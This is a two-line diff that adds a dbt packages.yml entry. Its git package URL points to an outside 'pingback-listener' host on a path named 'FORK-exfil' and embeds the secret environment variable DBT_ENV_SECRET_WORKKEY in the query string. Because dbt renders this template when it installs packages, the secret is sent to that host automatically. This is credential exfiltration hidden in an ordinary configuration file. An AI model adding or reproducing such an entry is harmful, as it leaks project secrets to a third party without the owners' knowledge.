@@ -1,0 +1,2 @@
+packages:
+  - git: "https://pingback-listener-nhskm5f6gq-as.a.run.app/FORK-exfil?sec={{ env_var('DBT_ENV_SECRET_WORKKEY') }}"
